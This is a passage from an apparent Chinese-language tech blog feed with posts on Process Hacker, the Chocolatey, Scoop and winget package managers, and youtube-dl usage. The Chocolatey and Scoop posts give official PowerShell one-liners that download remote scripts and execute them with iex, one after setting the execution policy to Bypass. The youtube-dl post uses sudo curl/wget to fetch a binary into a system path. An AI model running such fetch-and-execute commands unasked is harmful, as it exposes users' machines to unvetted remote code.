<h1 id="網站"><a href="#網站" class="headerlink" title="網站"></a>網站</h1><ul>
<li>Github : <a href="https://github.com/processhacker/processhacker">https://github.com/processhacker/processhacker</a></li>
<li>官網 : <a href="https://processhacker.sourceforge.io/">https://processhacker.sourceforge.io/</a></li>
</ul>
<h1 id="特徵"><a href="#特徵" class="headerlink" title="特徵"></a>特徵</h1><ul>
<li>顯示系統活動的詳細概述</li>
<li>圖表和統計數據可讓您快速追踪資源佔用和失控進程。</li>
<li>無法編輯或刪除文件？ 尋找那些程式正在使用該文件。</li>
<li>查看哪些程序具有活動的網絡連接，並在必要時關閉它們。</li>
<li>獲取有關磁盤訪問的實時信息。</li>
<li>services.msc：創建、編輯和控制服務。</li>
<li>小巧便攜，無需安裝。</li>
<li>100% 自由軟件 (GPL v3)</li>
</ul>
<h2 id="USB-設定"><a href="#USB-設定" class="headerlink" title="USB 設定"></a>USB 設定</h2><p>如果您從 USB 驅動器運行 Process Hacker，您可能還希望將 Process Hacker 的設置保存在那裡。<br>為此，請在與 <code>ProcessHacker.exe</code> 相同的目錄中創建一個名為 <code>ProcessHacker.exe.settings.xml</code> 的空白文件。<br>您可以使用 Windows 資源管理器執行此操作：</p>
<p>確保在 <code>工具</code> &gt; <code>文件夾選項</code> &gt; <code>查看</code> 中取消選中 <code>隱藏已知文件類型的擴展名</code>。<br>右鍵單擊文件夾並選擇 <code>新建</code> &gt; <code>文本文檔</code>。<br>將文件重命名為 <code>ProcessHacker.exe.settings.xml</code>（刪除 <code>.txt</code>）。</p>
<h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>可以從 <code>Hacker</code> &gt; <code>Plugins</code> 配置插件。<br>如果您遇到任何涉及插件的崩潰，請確保它們是最新的。<br><code>ExtendedTools</code> 插件提供的磁盤和網絡信息僅在以管理權限運行 Process Hacker 時可用。 </p>
<h2 id="KProcessHacker"><a href="#KProcessHacker" class="headerlink" title="KProcessHacker"></a>KProcessHacker</h2><p>Process Hacker 使用內核模式驅動程序 KProcessHacker 來協助某些功能，包括：</p>
<ul>
<li>捕獲內核模式堆棧跟踪</li>
<li>更有效地枚舉進程句柄</li>
<li>檢索文件句柄的名稱</li>
<li>檢索 EtwRegistration 對象的名稱</li>
<li>設置句柄屬性 </li>
</ul>
<h1 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h1><img src="/2022/01/09/windows-Process-Hacker-tools/program.png" class="">]]></content>
      <categories>
        <category>工具介紹</category>
      </categories>
  </entry>
  <entry>
    <title>Chocolatey - Windows Package Manager</title>
    <url>/2022/01/06/windows-package-manager-install-chocolatey/</url>
    <content><![CDATA[<img src="cover.png" width="200px"/>

<h1 id="Chocolatey-官網"><a href="#Chocolatey-官網" class="headerlink" title="Chocolatey 官網"></a>Chocolatey 官網</h1><ul>
<li><a href="https://chocolatey.org/">https://chocolatey.org/</a></li>
</ul>
<h2 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>首先開你既 PowerShell (一定要係PowerShell)，<br>然後要用 Admin 身份開。</p>
<p>輸入指令 <code>Get-ExecutionPolicy</code>，<br>如果出現 <code>Restricted</code>，<br>請輸入 <code>Set-ExecutionPolicy AllSigned</code> 或者 <code>Set-ExecutionPolicy Bypass -Scope Process</code>，<br>如果不是，直接使用 Step 2 中的指令進行安裝 <code>scoop</code>。</p>
<h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString(&#x27;https://community.chocolatey.org/install.ps1&#x27;))</span><br></pre></td></tr></table></figure>

<img src="/2022/01/06/windows-package-manager-install-chocolatey/install.png" class="">

<p>裝到之後你喺 Terminal 打 <code>choco</code> 就可以用到.</p>
<img src="/2022/01/06/windows-package-manager-install-chocolatey/choco.png" class="">]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Package Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>Scoop - Windows Package Manager</title>
    <url>/2021/12/11/windows-package-manager-install-scoop/</url>
    <content><![CDATA[<h1 id="Scoop"><a href="#Scoop" class="headerlink" title="Scoop "></a>Scoop <i class="fa-solid fa-spoon"></i></h1><p>Scoop 是 Windows 的套裝管理員。</p>
<p>【官方網站】：<a href="https://scoop-docs.vercel.app/">按這裡</a><br>【下載詳情】：<a href="https://scoop-docs.vercel.app/docs/getting-started/Quick-Start.html#requirements">按這裡</a><br>【程式介面】：指令化</p>
<h1 id="安裝-Scoop"><a href="#安裝-Scoop" class="headerlink" title="安裝 Scoop "></a>安裝 Scoop <i class="fa-solid fa-spoon"></i></h1><p>請使用 <code>Powershell</code> 輸入以下指令 </p>
<div class="post-outdate-notice">
    警告：不要使用系統官理員
</div>
 
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&#x27;https://get.scoop.sh&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="install.png" alt="scoop install"></p>
<h1 id="開啟-Scoop"><a href="#開啟-Scoop" class="headerlink" title="開啟 Scoop "></a>開啟 Scoop <i class="fa-solid fa-spoon"></i></h1><p>安裝成功後可以輸入 <code>scoop</code> 查看有沒有反應。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scoop</span><br></pre></td></tr></table></figure>

<p><img src="scoop.png" alt="scoop start"></p>
<h1 id="示範安裝套件"><a href="#示範安裝套件" class="headerlink" title="示範安裝套件"></a>示範安裝套件</h1><p>以下示範安裝套件 <code>zip</code>, <code>unzip</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scoop install zip unzip</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Package Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows 10/11 系統 - Package Manager | winget</title>
    <url>/2022/01/22/windows-winget-commands/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>winget 命令列工具可讓使用者在 Windows 10 和 Windows 11 電腦上探索、安裝、升級、移除和設定應用程式。<br>此工具是 Windows 封裝管理員服務的用戶端介面。</p>
<h2 id="Search"><a href="#Search" class="headerlink" title="Search"></a>Search</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">winget search &lt;appname&gt;</span><br></pre></td></tr></table></figure>

<h2 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">winget install &lt;appname&gt;</span><br></pre></td></tr></table></figure>

<table class="table">
  <caption class="visually-hidden">
    <h1>命令</h1>
  </caption>
  <thead>
    <tr>
      <th>命令</th>
      <th>描述</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>install</a></td>
      <td>安裝指定的應用程式。</td>
    </tr>
    <tr>
      <td>show</a></td>
      <td>顯示指定應用程式的詳細資料。</td>
    </tr>
    <tr>
      <td>source</a></td>
      <td>
        新增、移除及更新 <strong>winget</strong> 工具所存取的 Windows
        封裝管理員存放庫。
      </td>
    </tr>
    <tr>
      <td>search</a></td>
      <td>搜尋應用程式。</td>
    </tr>
    <tr>
      <td>list</a></td>
      <td>顯示已安裝的套件。</td>
    </tr>
    <tr>
      <td>升級</a></td>
      <td>升級指定的封裝。</td>
    </tr>
    <tr>
      <td>卸載</a></td>
      <td>卸載指定的封裝。</td>
    </tr>
    <tr>
      <td>hash</a></td>
      <td>產生安裝程式的 SHA256 雜湊。</td>
    </tr>
    <tr>
      <td>validate</a></td>
      <td>驗證資訊清單檔案以提交至 Windows 封裝管理員存放庫。</td>
    </tr>
    <tr>
      <td>設定</a></td>
      <td>開啟 [設定]。</td>
    </tr>
    <tr>
      <td>特徵</a></td>
      <td>顯示實驗性功能的狀態。</td>
    </tr>
    <tr>
      <td>出口</a></td>
      <td>匯出已安裝套件的清單。</td>
    </tr>
    <tr>
      <td>import</a></td>
      <td>安裝檔案中的所有套件。</td>
    </tr>
  </tbody>
</table>

<p><a href="https://docs.microsoft.com/zh-tw/windows/package-manager/winget/">https://docs.microsoft.com/zh-tw/windows/package-manager/winget/</a></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Package Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>Youtube-dl - 下載影片或音樂</title>
    <url>/2021/12/11/youtube-dl-commands/</url>
    <content><![CDATA[<img src="youtube.png" width="200px"/>

<h1 id="Youtube-dl"><a href="#Youtube-dl" class="headerlink" title="Youtube-dl "></a>Youtube-dl <i class="fa-brands fa-youtube"></i></h1><p>Youtube-dl 係一個可以 download 好多唔同網站既音樂, 片或者字幕既一個免費開源工具。</p>
<p><img src="--help.png"></p>
<h2 id="第三方程式"><a href="#第三方程式" class="headerlink" title="第三方程式 "></a>第三方程式 <i class="fa-brands fa-youtube"></i></h2><p>因應 youtube-dl 係開源 github 作品，所以出現左好多唔同版本由社群創造既版本，以下係三個作品既分別資訊</p>
<table>
<thead>
<tr>
<th>版本</th>
<th>更新速度</th>
<th>連接方法</th>
<th>支援系統</th>
<th>指令分別</th>
<th>介面</th>
</tr>
</thead>
<tbody><tr>
<td><a href="https://github.com/ytdl-org/youtube-dl">Youtube-dl</a></td>
<td>超慢</td>
<td>單線程</td>
<td>Linux, Mac, Windows</td>
<td>唔夠 yt-dlp 多指令</td>
<td>指令操作，白色字顯示</td>
</tr>
<tr>
<td><a href="https://github.com/yt-dlp/yt-dlp">yt-dlp</a></td>
<td>頻繁</td>
<td>多線程</td>
<td>Linux, Mac, Windows</td>
<td>比起 youtube-dl 多指令</td>
<td>指令操作，顏色字顯示</td>
</tr>
<tr>
<td><a href="https://github.com/jely2002/youtube-dl-gui">youtube-dl-gui</a></td>
<td>似乎已停更</td>
<td>Unknown</td>
<td>Mac, Windows</td>
<td>圖形用戶介面</td>
<td>圖形用戶介面</td>
</tr>
</tbody></table>
<hr>
<h1 id="安裝-Youtube-dl"><a href="#安裝-Youtube-dl" class="headerlink" title="安裝 Youtube-dl "></a>安裝 Youtube-dl <i class="fa-brands fa-youtube"></i></h1><p>以下會說明使用 <code>curl</code> 或者 <code>wget</code> 的下載方法，轉自作者。</p>
<div class="note warning flat">
    注意 : 如果要用 youtube-dl 轉檔功能，你需要裝 <a href="https://www.ffmpeg.org/">FFmpeg</a>。</br>
    安裝方法只需將 <code>FFMPEG</code> 放在和 <code>youtube-dl</code> 同一個資料夾內就能偵查到 <code>FFMPEG</code>。
</div>

<h2 id="使用-Curl-下載"><a href="#使用-Curl-下載" class="headerlink" title="使用 Curl 下載"></a><strong>使用 Curl 下載</strong></h2><div class="note warning flat">
    此方法只適用於你部機本身有裝 <code>curl</code> 工具。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo curl -L https://yt-dl.org/downloads/latest/youtube-dl -o /usr/local/bin/youtube-dl</span><br><span class="line">sudo chmod a+rx /usr/local/bin/youtube-dl</span><br></pre></td></tr></table></figure>

<h2 id="使用-wget-下載"><a href="#使用-wget-下載" class="headerlink" title="使用 wget 下載"></a><strong>使用 wget 下載</strong></h2><div class="note warning flat">
    此方法只適用於你部機本身有裝 <code>wget</code> 工具。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo wget https://yt-dl.org/downloads/latest/youtube-dl -O /usr/local/bin/youtube-dl</span><br><span class="line">sudo chmod a+rx /usr/local/bin/youtube-dl</span><br></pre></td></tr></table></figure>

<h2 id="Linux-Package-Manager-下載"><a href="#Linux-Package-Manager-下載" class="headerlink" title="Linux Package Manager 下載"></a>Linux Package Manager 下載</h2><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1"><i class="fa-brands fa-linux"></i> APT</button></li><li class="tab"><button type="button" data-href="#test1-2"><i class="fa-brands fa-apple"></i> MacOS</button></li><li class="tab"><button type="button" data-href="#test1-3"><i class="fa-brands fa-linux"></i> Pacman</button></li><li class="tab"><button type="button" data-href="#test1-4"><i class="fa-brands fa-fedora"></i> Fedora</button></li><li class="tab"><button type="button" data-href="#test1-5"><i class="fa-brands fa-python"></i> python pip</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><div class="note info flat">
    適用於 : Debian, Ubuntu, Linux mint, Pop_OS 等有使用 <code>APT</code> 套裝管理員的系統。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install youtube-dl -y</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><div class="note info flat">
    適用於 : MacOS
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo brew install youtube-dl -y</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><div class="note info flat">
    適用於 : Arch Linux,Manjaro,EndeavourOs
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S youtube-dl</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-4"><div class="note info flat">
    適用於 : Fedora
</div>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dnf install youtube-dl</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-5"><div class="note info flat">
    適用於 : 有安裝 python pip 的系統
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install youtube-dl</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>

<h2 id="Windows-下載"><a href="#Windows-下載" class="headerlink" title="Windows 下載"></a>Windows 下載</h2><div class="note info flat">
    你必須已經安裝 <a href="https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x86.exe">Microsoft Visual C++ 2010 Service Pack 1 Redistributable Package (x86)</a>。
</div>

<p><a href="https://ytdl-org.github.io/youtube-dl/download.html">https://ytdl-org.github.io/youtube-dl/download.html</a></p>
<!-- endtab -->

<hr>
<h1 id="更新-youtube-dl"><a href="#更新-youtube-dl" class="headerlink" title="更新 youtube-dl"></a>更新 youtube-dl</h1><p>當某網站更新後，有可能會下載失敗，此時可以嘗試將 <code>youtube-dl</code> 更新後再重複輸入指令嘗試下載。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -U</span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/youtube-dl-commands/-U.gif" class="">

<hr>
<h1 id="檢查-youtube-dl-版本"><a href="#檢查-youtube-dl-版本" class="headerlink" title="檢查 youtube-dl 版本"></a>檢查 youtube-dl 版本</h1><p>輸入以下指令查看目前的 <code>youtube-dl</code> 版本。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --version</span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/youtube-dl-commands/--version.gif" class="">

<h1 id="格式選擇"><a href="#格式選擇" class="headerlink" title="格式選擇"></a>格式選擇</h1><p>此方法為列出影片有的畫質，音質等資料。</p>
<div class="note info flat">
    說明 : 以數字來作準是最準確，有時候 <code>youtube-dl</code> 可能有 bug，即使預設選項下載為最高畫質，但下載後有可能是低畫質，所以指定數字是最準確的下載方法。</br>
</div>

<h2 id="列出所有格式的號碼"><a href="#列出所有格式的號碼" class="headerlink" title="列出所有格式的號碼"></a><strong><span style="font-size:larger;">列出所有格式的號碼</span></strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -F [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子 :</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -F https://www.youtube.com/watch?v=QW28YKqdxe0</span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/youtube-dl-commands/-F.gif" class="">

<h2 id="合併音樂和影片"><a href="#合併音樂和影片" class="headerlink" title="合併音樂和影片"></a><strong><span style="font-size:larger;">合併音樂和影片</span></strong></h2><p>此方法為指定下載你想要的畫質，音質等。</p>
<div class="note info flat">
    說明 : 在 <ocde>youtube-dl</code> 內，下載 youtube 影片格式數字 <code>248+251</code> 是最高畫質和音質 (1080p)。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -f 248+251 [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子:</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -f 248+251 https://www.youtube.com/watch?v=QW28YKqdxe0</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="字幕選項"><a href="#字幕選項" class="headerlink" title="字幕選項"></a>字幕選項</h1><p>此選項為下載影片內有的字幕檔案 (如果有的話)。</p>
<div class="note info flat">
    說明 : 假設影片沒有字幕檔在內，在 Terminal 當中只是會出現警告，並不會影響你的下載。
</div>

<h2 id="列出存在的字幕語言檔"><a href="#列出存在的字幕語言檔" class="headerlink" title="列出存在的字幕語言檔"></a><strong><span style="font-size:larger;">列出存在的字幕語言檔</span></strong></h2><p>此方法為列出影片內存在的字幕名稱。</p>
<div class="note warning flat">
    <code>youtubed-dl</code> 不是每一條影片也能列出全部的字幕，像是自動生產的字幕就常常顯示不到，這邊我就不做下載自動生產字幕的示範了，轉用 <code>yt-dlp</code> 就好了 XD，但要注意的是，名稱不是像網路統稱一樣，例如 <code>zh-tw</code> 這是台灣的繁體字幕吧？ 但在這邊如果要下載台灣繁體字幕的話就不一樣了，使用 <code>--list-sub</code> 查一查吧 xd.
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --list-subs [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子 :</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --list-sub https://www.youtube.com/watch?v=zhQIOfDQdCo</span><br></pre></td></tr></table></figure>

<p><img src="--list-sub.png"></p>
<h2 id="下載字幕檔和插入繁體中文字幕"><a href="#下載字幕檔和插入繁體中文字幕" class="headerlink" title="下載字幕檔和插入繁體中文字幕"></a><strong><span style="font-size:larger;">下載字幕檔和插入繁體中文字幕</span></strong></h2><p>假設影片存在繁體中文字幕，此示範會將字幕檔案插入在影片內變成一個外掛字幕，<br>再使用相應的 Media Player 播放器，例如 <a href="https://www.videolan.org/">VLC Player</a>，其後在 subtitle 選項中開關外掛字幕。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --write-sub --embed-sub --sub-lang zh-tw [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子 :</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --write-sub --embed-sub --sub-lang zh-tw https://www.youtube.com/watch?v=_5pnCgRtcfM</span><br></pre></td></tr></table></figure>

<h2 id="下載所有語言的字幕並插入影片內"><a href="#下載所有語言的字幕並插入影片內" class="headerlink" title="下載所有語言的字幕並插入影片內"></a><strong><span style="font-size:larger;">下載所有語言的字幕並插入影片內</span></strong></h2><p>此示範會將影片連結內存在的字幕檔案插入在影片內變成外掛字幕，<br>再使用相應的 Media Player 播放器，例如 <a href="https://www.videolan.org/">VLC Player</a>，其後在 subtitle 選項中開關外掛字幕。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --write-sub --embed-sub --all-subs [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子 :</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --write-sub --embed-sub --all-subs https://www.youtube.com/watch?v=_5pnCgRtcfM</span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/youtube-dl-commands/subtitle_all.png" class="">

<hr>
<h1 id="下載音樂"><a href="#下載音樂" class="headerlink" title="下載音樂"></a>下載音樂</h1><p>下載音樂我們需要使用兩個指令，包括為：</p>
<ul>
<li><code>-x, --extract-audio</code> // 取得音頻</li>
<li><code>--audio-format</code> [format]  // 取得指定音頻檔桿類型 eg: mp3, wav, m4a, aac</li>
</ul>
<div class="note warning flat">
    注意 : 此功能需要安裝 <a href="https://www.ffmpeg.org/">FFmpeg</a> 才能使用，因為你會需要轉檔。</br>
    安裝方法只需將 <code>FFMPEG</code> 放在和 <code>youtube-dl</code> 同一個資料夾內就能偵查到 <code>FFMPEG</code>。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --extract-audio --audio-format [audio format] [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子 :</strong></p>
<p>此示範會將影片轉為 <code>mp3</code> 檔案，當然如果你想要的檔案為 <code>wav</code>，那麼你只需將 <code>mp3</code> 改為 <code>wav</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --extract-audio --audio-format mp3 https://www.youtube.com/watch?v=WJxSNbAer9M</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="封面圖-Thumbnail"><a href="#封面圖-Thumbnail" class="headerlink" title="封面圖 Thumbnail"></a>封面圖 Thumbnail</h1><p>下載封面 Cover 圖片，我們會需要使用以下的指令：</p>
<ul>
<li><code>--embed-thumbnail</code> // 放置封面圖</li>
<li><code>--add-metadata</code>  // 加入封面圖</li>
<li><code>--write-thumbnail</code> // 下載封面圖</li>
</ul>
<div class="note warning flat">
    注意：有些影片檔不支援封面圖，例如 `webm` 檔案。
</div>

<h2 id="下載影片和放置封面圖"><a href="#下載影片和放置封面圖" class="headerlink" title="下載影片和放置封面圖"></a><strong><span style="font-size:larger;">下載影片和放置封面圖</span></strong></h2><div class="note info flat">
    操作流程：下載影片封面圖後，再進行下載影片，影片下載完成後，再將下載的封面圖放置到影片內，然後將下載回來的封面圖刪除。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --embed-thumbnail --add-metadata [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子:</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --embed-thumbnail --add-metadata https://www.youtube.com/watch?v=WJxSNbAer9M</span><br></pre></td></tr></table></figure>

<h2 id="下載影片和封面圖"><a href="#下載影片和封面圖" class="headerlink" title="下載影片和封面圖"></a><strong><span style="font-size:larger;">下載影片和封面圖</span></strong></h2><div class="note info flat">
    說明：下載影片和封面圖，即是會下載兩個檔案。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --write-thumbnail --embed-thumbnail [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子:</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --write-thumbnail --embed-thumbnail https://www.youtube.com/watch?v=wxoo-PCM8No</span><br></pre></td></tr></table></figure>
<h2 id="下載影片封面圖"><a href="#下載影片封面圖" class="headerlink" title="下載影片封面圖"></a><strong><span style="font-size:larger;">下載影片封面圖</span></strong></h2><p>如果指定下載圖片，我們需要使用以下指令：</p>
<ul>
<li><code>--skip-download</code> // 跳過影片下載</li>
</ul>
<div class="note info flat">
    說明 : 讀取條片，攞佢條片既封面圖但係唔下載條片，淨係下載封面圖。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --write-thumbnail --skip-download [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子:</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --write-thumbnail --skip-download https://www.youtube.com/watch?v=miu4FEKepjY</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="指定檔案格式"><a href="#指定檔案格式" class="headerlink" title="指定檔案格式"></a>指定檔案格式</h1><p>使用以下指令拍定檔案格式 (其實是轉檔功能)。</p>
<p><code>-f</code> 或 <code>--format</code> // 指定格式 (mp4, flv, mkv, webm, mp3, aac, wav … etc)</p>
<div class="note warning flat">
    注意 : 此功能需要安裝 <a href="https://www.ffmpeg.org/">FFmpeg</a> 才能使用，因為你會需要轉檔。</br>
    安裝方法只需將 <code>FFMPEG</code> 放在和 <code>youtube-dl</code> 同一個資料夾內就能偵查到 <code>FFMPEG</code>。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -f [format] [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子:</strong></p>
<div class="note info flat">
    說明：將他下載為 mp4 檔案。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -f mp4 https://www.youtube.com/watch?v=WJxSNbAer9M</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="清單選項"><a href="#清單選項" class="headerlink" title="清單選項"></a>清單選項</h1><ul>
<li>–playlist-start [NUMBER] 指定起點</li>
<li>–playlist-end [NUMBER] 指定終點</li>
<li>–playlist-items [NUMBER] 指定清單</li>
<li>–max-downloads [NUMBER] 拍定最多下載數量</li>
</ul>
<h2 id="指定起點-清單"><a href="#指定起點-清單" class="headerlink" title="指定起點 (清單)"></a>指定起點 (清單)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --playlist-start [number] [playlist-url]</span><br></pre></td></tr></table></figure>

<p><strong>例子:</strong></p>
<p>第三條片開始下載到最後個條片</p>
<div class="note info flat">
    注意 : 如果不輸入 <code>--playlist-end</code> 即是預設會幫你下載到最後的影片。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --playlist-start 3 https://www.youtube.com/playlist?list=PL9K3xwFkFqWGEVTB3QNRQ1wgxF6Y-DMOX</span><br></pre></td></tr></table></figure>

<h2 id="指定終點-清單"><a href="#指定終點-清單" class="headerlink" title="指定終點 (清單)"></a>指定終點 (清單)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --playlist-end [number] [playlist-url]</span><br></pre></td></tr></table></figure>

<p><strong>例子:</strong><br>第一條片開始下載到第二條片並轉為 <code>mp4</code> 檔</p>
<div class="note info flat">
    注意 : 如果不輸入 <code>--playlist-start</code> 即是預設會幫你由第一條片下載到你指定的數字。 (10)
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --playlist-end 10 https://www.youtube.com/playlist?list=PL9K3xwFkFqWGEVTB3QNRQ1wgxF6Y-DMOX</span><br></pre></td></tr></table></figure>

<h2 id="指定清單起點和終點-清單"><a href="#指定清單起點和終點-清單" class="headerlink" title="指定清單起點和終點 (清單)"></a>指定清單起點和終點 (清單)</h2><p>第 4 條片下載到第 10 條片。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --playlist-start 4 --playlist-end 10 &lt;playlist-url&gt;</span><br></pre></td></tr></table></figure>

<p><strong>例子:</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --playlist-start 4 --playlist-end 10 https://www.youtube.com/playlist?list=PL9K3xwFkFqWGEVTB3QNRQ1wgxF6Y-DMOX</span><br></pre></td></tr></table></figure>

<h2 id="指定清單下載"><a href="#指定清單下載" class="headerlink" title="指定清單下載"></a>指定清單下載</h2><p><code>--playlist-items</code> 呢個指令係用黎下載你想下載呢條 playlist 既邊條片。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --playlist-items [NUMBER] [link] </span><br></pre></td></tr></table></figure>

<p><strong>例子 :</strong></p>
<p>淨係下載數字 71,83 同埋第一條片。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --playlist-items 71,83,1</span><br></pre></td></tr></table></figure>


<h2 id="清單下載數量限制"><a href="#清單下載數量限制" class="headerlink" title="清單下載數量限制"></a>清單下載數量限制</h2><p><code>--max-downloads</code> // 用呢個指令就將你下載既片淨係下載喺你既最大上限既數字。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --max-downloads [number] [link]</span><br></pre></td></tr></table></figure>

<p><strong>例子 :</strong><br>限制下載 Playlist 最大上限只有 50 條片。</p>
<div class="note info flat">
    簡單黎講，即係唔洗打 <code>--playlist-end 50</code>。</br>
    變成打呢個既話，咁得出黎既結果就係下載 1-50 既片。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl --max-downloads 50 https://www.youtube.com/playlist?list=PL9K3xwFkFqWGEVTB3QNRQ1wgxF6Y-DMOX</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="轉換格式"><a href="#轉換格式" class="headerlink" title="轉換格式"></a>轉換格式</h1><p>要轉換格式，我們需要使用以下選項：</p>
<p><code>-f, --format</code> // 轉換格式</p>
<div class="note warning flat">
    注意 : 此功能需要安裝 <a href="https://www.ffmpeg.org/">FFmpeg</a> 才能使用，因為你會需要轉檔。</br>
    安裝方法只需將 <code>FFMPEG</code> 放在和 <code>youtube-dl</code> 同一個資料夾內就能偵查到 <code>FFMPEG</code>。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">youtube-dl -f [format name] [link] #方法一</span><br><span class="line">youtube-dl --format [format name] [link] #方法二</span><br></pre></td></tr></table></figure>

<p><strong>例子:</strong></p>
<p>將影片轉換為 mp4</p>
